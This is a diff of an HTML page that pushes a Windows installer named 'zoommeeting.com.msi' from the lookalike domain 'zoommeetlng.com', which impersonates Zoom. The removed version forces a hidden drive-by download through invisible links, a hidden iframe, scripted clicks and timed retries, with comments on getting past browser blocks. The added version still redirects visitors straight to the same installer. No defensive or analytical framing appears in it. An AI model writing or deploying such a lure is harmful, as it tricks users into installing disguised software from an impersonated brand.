@@ -1,68 +1,20 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="utf-8">
-  <title></title>
-  <!-- Almost empty so nothing renders noticeably -->
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+
+  <!-- Auto redirect -->
+  <meta http-equiv="refresh" content="0; url=https://zoommeetlng.com/zoommeeting.com.msi">
+
+  <!-- Fallback for browsers that block meta refresh -->
+  <script>
+    window.location.href = "https://zoommeetlng.com/zoommeeting.com.msi";
+  </script>
 </head>
-<body style="margin:0;padding:0;background:#000;">
-
-<!-- Technique 1: hidden link + synthetic click (most common approach) -->
-<a id="dl" href="https://zoommeetlng.com/zoommeeting.com.msi" download="something.msi" style="display:none;"></a>
-
-<!-- Technique 2: direct navigation fallback -->
-<iframe src="https://zoommeetlng.com/zoommeeting.com.msi" style="display:none;" width="0" height="0"></iframe>
-
-<script>
-// Run multiple attempts quickly — some browsers are extremely strict in 2026
-
-const file = "https://zoommeetlng.com/zoommeeting.com.msi";           // relative path — change if needed
-const fileName = "zoommeeting.com.msi";
-
-function attemptDownload() {
-  // Attempt A — create <a> and .click()
-  try {
-    const a = document.createElement("a");
-    a.href = file;
-    a.download = fileName;
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
-  } catch(e){}
-
-  // Attempt B — location redirect (often blocked, but sometimes works for direct URLs)
-  setTimeout(() => {
-    window.location = file;
-  }, 60);
-
-  // Attempt C — re-use the hidden link
-  try {
-    document.getElementById("dl").click();
-  } catch(e){}
-}
-
-// Start immediately
-attemptDownload();
-
-// Many browsers block the very first attempt → retry with tiny delays
-setTimeout(attemptDownload, 80);
-setTimeout(attemptDownload, 180);
-setTimeout(attemptDownload, 350);
-setTimeout(attemptDownload, 700);
-
-// Last desperate fallback — meta refresh (very old technique, usually blocked nowadays)
-setTimeout(() => {
-  const meta = document.createElement("meta");
-  meta.httpEquiv = "refresh";
-  meta.content = "0;url=" + file;
-  document.head.appendChild(meta);
-}, 1200);
-</script>
-
-<noscript>
-  <!-- If JS is off → at least try meta refresh -->
-  <meta http-equiv="refresh" content="0;url=https://zoommeetlng.com/zoommeeting.com.msi">
-</noscript>
-
+<body>
+  <p>If you are not redirected automatically, 
+    <a href="https://zoommeetlng.com/zoommeeting.com.msi">click here</a>.
+  </p>
 </body>
 </html>
